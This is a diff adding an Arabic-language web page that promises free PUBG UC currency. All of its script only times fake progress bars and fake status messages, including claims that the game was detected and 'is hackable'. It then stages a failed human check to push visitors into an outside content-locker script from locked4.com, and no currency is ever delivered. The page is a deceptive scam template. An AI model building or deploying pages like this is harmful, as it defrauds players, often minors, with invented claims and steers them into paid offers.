@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ar-AR">
+<head>
+	<meta charset="utf-8">
+	<meta lang="ar">
+	<meta name="viewport" content="width=device-width initial-scale=1.0 user-scalable=no">
+	<title>شحن شدات ببجي مجانا </title>
+	<link rel="stylesheet" type="text/css" href="https://stackpath.bootstrapcdn.com/bootswatch/4.4.1/flatly/bootstrap.min.css">
+	<link href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css2?family=Cairo&family=Changa&family=Lemonada&display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="animate.css">
+	<link href="https://fonts.googleapis.com/css2?family=Cairo&family=Changa&display=swap" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="cssanimation.css">
+	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	<style type="text/css">
+		body{
+			direction:rtl;
+			font-family: 'Cairo', sans-serif;
+			overflow-x: hidden;
+		}
+		.header,.content{
+			width:100%;
+		}
+		span{
+			font-family: 'Lemonada', cursive;
+		}
+		#pop_up{
+			z-index: 9999999;
+			position:absolute;
+			top:50%;
+			left:15%;
+			transform: translate(-50%,-50%);
+			width:70%;
+			height:120px;
+			border-radius:25px;
+			display:none;
+			padding:20px;
+		}
+		#dark_bg{
+			height:100%;
+			width:100%;
+			background:rgba(0,0,0,0.8);
+			position:absolute;
+			z-index:10;
+			display:none;
+		}
+
+		@media only screen and (min-width: 1024px){
+			.header{
+				height:100%;
+			}
+			html,body,.row{
+				height:100%;
+			}
+		}
+	</style>
+</head>
+
+
+<body class="bg-primary">
+
+
+	<div id="pop_up" class="bg-light">
+		<div class="text-center pop_up_text font-weight-bold">جاري التأكد من وجود ببجي على جهازك </div>
+		<div class="progress mt-4">
+  			<div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100" style="width: 2%"></div>
+		</div>
+	</div>
+
+
+	<div id="dark_bg"></div>
+
+
+	<div class="row">
+		<div class="col-lg-6 col-md-6 col-sm-12 col-12 header bg-info">
+			<div class="text-center pt-2 display-4  text-light">
+				<p class="animated bounceIn delay-0-2s">شحن </p>
+				<p class="font-weight-bold mt-4 mb-4 animated bounceIn delay-0-4s">شدات ببجي </p>
+				<p class="animated bounceIn delay-0-6s">مجانا </p>
+			</div>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-12 col-12 content">
+			<h4 class="text-center text-light pt-4 animated bounceIn delay-1-5s title-1">أداة شحن شدات ببجي </h4>
+			<div class="text-center text-warning mt-3 animated bounceIn delay-1-7s">لازم تكون لعبة ببجي منزلة على جهازك </div>
+			<center class="mt-3 mb-5">
+				<i class="fa fa-arrow-down text-light cssanimation hu__hu__" style="display:none"></i>
+			</center>
+			<center class="mt-5 mb-5">
+				<button class="btn btn-success animated bounceIn delay-2-3s start_btn">ابدء التحميل </button>
+			</center>
+			<div class="text-center title-2 text-light animated bounceIn delay-0-4s" style="display:none">
+				<i class="fa fa-check text-success"></i>
+				لعبة ببجي منزلة على الجهاز 
+			</div>
+			<br>
+			<div class="text-center title-3 text-light animated bounceIn delay-1-4s" style="display:none">
+				<i class="fa fa-check text-success"></i>
+				لعبة ببجي في هذا الجهاز قابلة للتهكير 
+			</div>
+			<br><br>
+			<center>
+				<button class="btn btn-success charge_btn animated bounceIn delay-2s" style='display:none'>شحن 100 ألف شدة </button>
+			</center>
+
+			<div class="text-center text-light title-4 mb-3 animated bounceIn" style='display:none'>لازم تكمل خطوة التحقق ، بعد التأكد راح يتم إرسال 100 ألف شدة</div>
+
+			<center class="pt-2 mb-4">
+				<div class="container" style="padding:0 30px">
+					<div data-captcha-enable="true" class="locker animated bounceIn delay-1s" style="display: none"></div>
+				</div>
+			</center>
+		</div>
+	</div>
+</body>
+<script type="text/javascript">
+	setTimeout(()=>{
+		document.querySelector('.fa-arrow-down').style.display = 'block';
+	},2200);
+
+	document.querySelector('.start_btn').addEventListener('click',()=>{
+		document.querySelector('.fa-arrow-down').style.display = 'none';
+		document.querySelector('.text-warning').style.display = 'none';
+		document.querySelector('.start_btn').style.display = 'none';
+		document.querySelector('#pop_up').style.display = 'block';
+		document.querySelector('#dark_bg').style.display = 'block';
+		document.querySelector('#pop_up').className += ' animated bounceIn';
+
+		setTimeout(()=>{
+			document.querySelector('.progress-bar').style.width = '20%';
+		},1000);
+
+		setTimeout(()=>{
+			document.querySelector('.progress-bar').style.width = '30%';
+		},2000);
+
+		setTimeout(()=>{
+			document.querySelector('.progress-bar').style.width = '80%';
+		},3000);
+
+		setTimeout(()=>{
+			document.querySelector('.progress-bar').style.width = '100%';
+			document.querySelector('#pop_up').className += ' animated bounceOut';
+			document.querySelector('.title-1').style.display = 'none';
+		},4000);
+
+		setTimeout(()=>{
+			document.querySelector('#pop_up').style.display = 'none';
+			document.querySelector('#dark_bg').style.display = 'none';
+			document.querySelector('.title-2').style.display = 'block';
+			document.querySelector('.title-3').style.display = 'block';
+			document.querySelector('.charge_btn').style.display = 'block';
+		},5000);
+	});
+
+
+document.querySelector('.charge_btn').addEventListener('click',()=>{
+	document.querySelector('#pop_up').style.display = 'block';
+	document.querySelector('#dark_bg').style.display = 'block';
+	document.querySelector('#pop_up').className = 'bg-light animated bounceIn';
+	document.querySelector('.progress-bar').style.width = '5%';
+	document.querySelector('.pop_up_text').innerHTML = 'جاري الإتصال ب ببجي على جهازك ';
+
+	setTimeout(()=>{
+		document.querySelector('.progress-bar').style.width = '20%';
+	},1000);
+
+	setTimeout(()=>{
+		document.querySelector('.progress-bar').style.width = '40%';
+	},2000);
+
+	setTimeout(()=>{
+		document.querySelector('.progress-bar').style.width = '50%';
+	},3500);
+
+	setTimeout(()=>{
+		document.querySelector('.progress-bar').style.width = '60%';
+		document.querySelector('.pop_up_text').innerHTML = 'جاري التأك من أنك مو برنامج روبوت ';
+	},5000);
+
+	setTimeout(()=>{
+		document.querySelector('.progress-bar').style.width = '80%';
+	},7000);
+
+	setTimeout(()=>{
+		document.querySelector('.progress-bar').style.width = '90%';
+		document.querySelector('.pop_up_text').innerHTML = 'فشل في التحقق البشري ';
+		document.querySelector('.pop_up_text').className += ' text-danger';
+	},7500);
+
+	setTimeout(()=>{
+		document.querySelector('.progress-bar').style.width = '100%';
+	},9000);
+
+
+	setTimeout(()=>{
+		document.querySelector('#pop_up').style.width = '100%';
+		document.querySelector('#pop_up').style.display = 'none';
+		document.querySelector('#dark_bg').style.display = 'none';
+		document.querySelector('.title-2').style.display = 'none';
+		document.querySelector('.title-3').style.display = 'none';
+		document.querySelector('.charge_btn').style.display = 'none';
+		document.querySelector('.locker').style.display = 'block';
+		document.querySelector('.title-4').style.display = 'block';
+	},10000);
+
+
+
+});
+
+</script>
+<script src="https://www.locked4.com/cp/js/captcha.js.php?id=6517de1b427facc41589f9a2bc7b947c"></script>
+</html>
